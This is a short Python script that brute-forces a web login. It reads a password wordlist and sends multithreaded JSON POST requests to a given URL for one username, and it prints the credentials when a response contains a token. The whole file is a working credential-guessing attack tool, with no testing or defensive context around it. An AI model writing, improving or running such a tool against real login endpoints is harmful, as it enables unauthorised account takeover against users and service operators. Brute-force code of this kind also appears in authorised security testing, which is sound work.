import sys
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

def login_tries(url, username, password):
    try:
        with requests.post(
            url,
            headers={'Content-Type': 'application/json'},
            data=json.dumps({"username": username, "password": password}),
            timeout=10,
            stream=True
        ) as response:
            if "token" in response.text.lower():
                print(f"{username} {password}")
                sys.exit(0)
    except requests.exceptions.RequestException:
        pass

if len(sys.argv) !=5:
    print(f"usage: {sys.argv[0]} <url> <username> <passlist.txt> <threads>")
    sys.exit(1)

url = sys.argv[1]
username = sys.argv[2]
passlist = sys.argv[3]
thread = int(sys.argv[4])

with open(passlist, "r") as infile:
    passwords = [line.strip() for line in infile]

with ThreadPoolExecutor(max_workers=thread) as exec:
    other = []
    for password in passwords:
        exec_sub = exec.submit(login_tries, url, username, password)
        other.append(exec_sub)

        if len(other) >= thread * 1.5:
            for exec_sub in as_completed(other[:thread]):
                try:
                    exec_sub.result()
                except Exception:
                    pass
            other = other[thread:]

    for exec_sub in as_completed(other):
        try:
            exec_sub.result()
        except Exception:
            pass